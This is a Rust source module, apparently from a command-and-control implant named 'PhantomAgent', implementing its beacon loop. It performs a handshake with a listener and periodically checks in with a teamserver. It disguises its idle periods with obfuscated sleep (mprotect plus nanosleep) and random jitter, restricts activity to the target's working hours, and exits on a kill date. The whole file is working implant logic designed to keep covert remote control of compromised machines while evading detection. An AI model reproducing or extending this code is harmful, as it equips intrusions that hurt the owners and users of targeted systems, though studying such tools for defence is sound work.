//! Main agent run loop, sleep/jitter, and working-hours logic.

use std::time::Duration;

use time::{OffsetDateTime, Time};
use tracing::{info, warn};

use crate::sleep_obfuscate::blocking_sleep;

use super::PhantomAgent;
use crate::error::PhantomError;

impl PhantomAgent {
    /// Run the main callback loop until exit conditions are met.
    pub async fn run(&mut self) -> Result<(), PhantomError> {
        if self.config.listener_pub_key.is_some() {
            self.ecdh_init_handshake().await?;
        } else {
            self.init_handshake().await?;
        }
        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "phantom initialized");

        loop {
            if self.kill_date_elapsed() {
                warn!("phantom kill date reached; exiting");
                self.send_kill_date_callback().await?;
                break;
            }

            let delay = Duration::from_millis(self.compute_sleep_delay());
            let mode = self.config.sleep_mode;
            // `spawn_blocking` offloads the mprotect+nanosleep cycle to a
            // dedicated OS thread so the Tokio executor remains schedulable.
            // It works on both multi-thread and current-thread runtimes.
            let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
            if self.checkin().await? {
                break;
            }
        }

        Ok(())
    }

    pub(super) fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        let now = current_local_time();
        let working_hours = self.state.working_hours().or(self.config.working_hours);
        if let Some(working_hours) = working_hours
            && !is_within_working_hours_at(working_hours, now)
            && base > 0
        {
            return sleep_until_working_hours(working_hours, now);
        }

        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }

        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let spread = jitter_range.saturating_mul(2);
        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
        base.saturating_sub(jitter_range).saturating_add(jitter)
    }

    pub(super) fn kill_date_elapsed(&self) -> bool {
        let kill_date = self.state.kill_date().or(self.config.kill_date).filter(|&kd| kd > 0);
        match kill_date {
            Some(kill_date) => {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|duration| i64::try_from(duration.as_secs()).unwrap_or(i64::MAX))
                    .unwrap_or_default();
                now >= kill_date
            }
            None => false,
        }
    }

    /// Send a `CommandKillDate` callback to the teamserver to notify it that
    /// the kill date has been reached, then flush any remaining callbacks.
    async fn send_kill_date_callback(&mut self) -> Result<(), PhantomError> {
        self.state.queue_kill_date_callback();
        self.flush_pending_callbacks().await
    }
}

pub(super) fn current_local_time() -> OffsetDateTime {
    OffsetDateTime::now_local().unwrap_or_else(|_| OffsetDateTime::now_utc())
}

pub(super) fn is_within_working_hours_at(working_hours: i32, now: OffsetDateTime) -> bool {
    let working_hours = working_hours as u32;
    if (working_hours >> 22) & 1 == 0 {
        return true;
    }

    let start = unpack_working_hours_time(working_hours, 17, 11);
    let end = unpack_working_hours_time(working_hours, 6, 0);
    let current = now.time();

    if current.hour() < start.hour() || current.hour() > end.hour() {
        return false;
    }
    if current.hour() == start.hour() && current.minute() < start.minute() {
        return false;
    }
    if current.hour() == end.hour() && current.minute() > end.minute() {
        return false;
    }

    true
}

pub(super) fn sleep_until_working_hours(working_hours: i32, now: OffsetDateTime) -> u64 {
    let working_hours = working_hours as u32;
    let start = unpack_working_hours_time(working_hours, 17, 11);
    let end = unpack_working_hours_time(working_hours, 6, 0);
    let current_minutes = u64::from(now.hour()) * 60 + u64::from(now.minute());
    let start_minutes = u64::from(start.hour()) * 60 + u64::from(start.minute());
    let end_minutes = u64::from(end.hour()) * 60 + u64::from(end.minute());

    let minutes_until_start = if current_minutes > end_minutes {
        ((24 * 60) - current_minutes) + start_minutes
    } else {
        start_minutes.saturating_sub(current_minutes)
    };
    minutes_until_start.saturating_mul(60_000)
}

fn unpack_working_hours_time(working_hours: u32, hour_shift: u32, minute_shift: u32) -> Time {
    let hour = ((working_hours >> hour_shift) & 0b01_1111) as u8;
    let minute = ((working_hours >> minute_shift) & 0b11_1111) as u8;
    Time::from_hms(hour.min(23), minute.min(59), 0).unwrap_or(Time::MIDNIGHT)
}
